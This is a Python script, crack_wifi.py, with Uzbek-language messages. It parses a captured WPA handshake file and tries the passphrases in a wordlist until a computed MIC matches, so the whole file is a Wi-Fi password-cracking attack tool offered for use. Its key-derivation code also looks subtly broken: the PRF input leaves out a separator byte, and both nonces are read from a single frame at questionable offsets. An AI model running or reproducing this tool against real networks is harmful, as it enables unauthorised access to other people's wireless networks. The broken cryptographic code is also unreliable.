import sys
import hmac
import hashlib
import binascii
import time
from scapy.all import rdpcap, EAPOL, Dot11Beacon, Dot11Elt, Dot11

def extract_ssid(packets):
    for pkt in packets:
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode(errors='ignore')
            return ssid
    return None

def extract_handshake(packets):
    handshake = {}
    for pkt in packets:
        if pkt.haslayer(EAPOL):
            try:
                if pkt.addr2:  # AP MAC
                    ap_mac = pkt.addr2.lower()
                elif pkt.addr3:  # Sometimes AP MAC is here
                    ap_mac = pkt.addr3.lower()
                else:
                    continue
                    
                client_mac = pkt.addr1.lower() if pkt.addr1 else None
                if not client_mac:
                    continue
                    
                eapol_packet = pkt.getlayer(EAPOL).original
                if len(eapol_packet) < 97:
                    continue
                    
                # Extract MIC (bytes 81-97 in EAPOL frame)
                mic = eapol_packet[81:97].hex()
                
                # Zero out MIC field for verification
                eapol_data = eapol_packet[:81] + bytes(16) + eapol_packet[97:]
                
                # Extract nonces (bytes 13-45 and 45-77 in EAPOL frame)
                anonce = eapol_packet[13:45]
                snonce = eapol_packet[45:77]
                
                return (ap_mac.replace(':', ''),
                       client_mac.replace(':', ''),
                       anonce,
                       snonce,
                       mic,
                       eapol_data)
            except Exception as e:
                print(f"Error processing packet: {e}")
                continue
    return None, None, None, None, None, None

def get_pmk(passphrase, ssid):
    return hashlib.pbkdf2_hmac('sha1', 
                              passphrase.encode('utf-8'), 
                              ssid.encode('utf-8'), 
                              4096, 
                              32)

def get_ptk(pmk, a_mac, s_mac, a_nonce, s_nonce):
    # PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
    # PTK = PRF-X(PMK, "Pairwise key expansion",
    #             Min(AA,SPA) || Max(AA,SPA) ||
    #             Min(ANonce,SNonce) || Max(ANonce,SNonce))
    min_mac = min(a_mac, s_mac)
    max_mac = max(a_mac, s_mac)
    min_nonce = min(a_nonce, s_nonce)
    max_nonce = max(a_nonce, s_nonce)
    
    data = min_mac + max_mac + min_nonce + max_nonce
    ptk = b''
    for i in range(4):
        ptk += hmac.new(pmk, 
                       b"Pairwise key expansion" + 
                       data + 
                       bytes([i]), 
                       hashlib.sha1).digest()
    return ptk[:64]

def crack_wifi(cap_file, wordlist_file):
    packets = rdpcap(cap_file)
    ssid = extract_ssid(packets)
    if not ssid:
        ssid = input("SSID topilmadi. Qo'lda kiriting: ")

    ap_mac, client_mac, anonce, snonce, real_mic, eapol = extract_handshake(packets)
    if not all([ap_mac, client_mac, anonce, snonce, real_mic, eapol]):
        print("[!] To'liq handshake topilmadi.")
        return

    print(f"[i] Tarmoq nomi (SSID): {ssid}")
    print(f"[i] AP MAC: {ap_mac}")
    print(f"[i] Client MAC: {client_mac}")
    print("[i] Parollar sinovda...")

    start_time = time.time()
    checked = 0

    try:
        with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                passphrase = line.strip()
                if not passphrase:
                    continue

                checked += 1
                try:
                    pmk = get_pmk(passphrase, ssid)
                    
                    # Convert MAC addresses to bytes
                    a_mac = binascii.unhexlify(ap_mac)
                    s_mac = binascii.unhexlify(client_mac)
                    
                    ptk = get_ptk(pmk, a_mac, s_mac, anonce, snonce)
                    
                    # Calculate MIC
                    kck = ptk[:16]  # First 16 bytes of PTK is KCK (Key Confirmation Key)
                    mic = hmac.new(kck, eapol, hashlib.sha1).digest()[:16].hex()

                    elapsed = time.time() - start_time
                    rate = checked / elapsed if elapsed > 0 else 0

                    print(f"[{checked}] Sinalayapti: {passphrase[:20]}... | {rate:.2f} parol/s | {int(elapsed)}s o'tdi", end='\r')

                    if mic == real_mic:
                        print(f"\n[+] Parol topildi: {passphrase}")
                        return
                        
                except Exception as e:
                    print(f"\n[!] Xato '{passphrase}': {e}")
                    continue

    except KeyboardInterrupt:
        print("\n[!] To'xtatildi.")
        return

    print("\n[-] Parol topilmadi.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Foydalanish: python crack_wifi.py handshake.cap wordlist.txt")
        sys.exit(1)

    cap_path = sys.argv[1]
    wordlist_path = sys.argv[2]
    crack_wifi(cap_path, wordlist_path)